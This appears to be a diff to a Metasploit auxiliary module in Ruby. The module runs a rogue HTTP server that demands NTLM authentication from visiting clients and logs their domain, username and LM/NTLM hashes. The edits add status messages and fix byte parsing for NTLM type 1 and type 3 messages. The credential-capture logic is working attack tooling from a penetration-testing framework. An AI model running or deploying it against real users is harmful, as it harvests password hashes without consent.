@@ -71,13 +71,14 @@ class Metasploit3 < Msf::Auxiliary
 			when self.get_resource
 				# If the host has not started auth, send 401 authenticate with only the NTLM option
 				if(!request.headers['Authorization'])
-					response = create_response(401)
+					response = create_response(401, "Unauthorized")
 					response.headers['WWW-Authenticate'] = "NTLM"
 					cli.send_response(response)
 				else
 					method,hash = request.headers['Authorization'].split(/\s+/,2)
 					# If the method isn't NTLM something odd is goign on. Regardless, this won't get what we want, 404 them
 					if(method != "NTLM")
+						print_status("Unrecognized Authorization header, responding with 404")
 						send_not_found(cli)
 						return false
 					end
@@ -86,6 +87,7 @@ class Metasploit3 < Msf::Auxiliary
 					cli.send_response(response)
 				end
 			else
+				print_status("Responding with 404")
 				send_not_found(cli)
 				return false
 		end
@@ -99,9 +101,7 @@ class Metasploit3 < Msf::Auxiliary
 		#authorization string is base64 encoded message
 		message = Rex::Text.decode_base64(hash)
 
-		if(message[8] == 0x01)
-			reqflags = message[12..15]
-			reqflags = Integer("0x" + reqflags.unpack("h8").to_s.reverse)
+		if(message[8,1] == "\x01")
 			domain = datastore['DOMAIN']
 			server = datastore['SERVER']
 			dnsname = datastore['DNSNAME']
@@ -117,13 +117,13 @@ class Metasploit3 < Msf::Auxiliary
 				end
 			end
 
-			response = create_response(401)
+			response = create_response(401, "Unauthorized")
 			chalhash = UTILS.process_type1_message(hash,@challenge,domain,server,dnsname,dnsdomain)
 			response.headers['WWW-Authenticate'] = "NTLM " + chalhash
 			return response
 
 		#if the message is a type 3 message, then we have our creds
-		elsif(message[8] == 0x03)
+		elsif(message[8,1] == "\x03")
 			domain,user,host,lm_hash,ntlm_hash = UTILS.process_type3_message(hash)
 			print_status("#{cli.peerhost}: #{domain}\\#{user} #{lm_hash}:#{ntlm_hash} on #{host}")
 
@@ -170,8 +170,8 @@ class Metasploit3 < Msf::Auxiliary
 		domain = nil
 		workstation = nil
 
-		reqflags = message[12..15]
-		reqflags = Integer("0x" + reqflags.unpack("h8").to_s.reverse)
+		reqflags = message[12,4]
+		reqflags = reqflags.unpack("V").first
 
 		if((reqflags & CONST::NEGOTIATE_DOMAIN) == CONST::NEGOTIATE_DOMAIN)
 			dom_len = message[16,2].unpack('v')[0].to_i
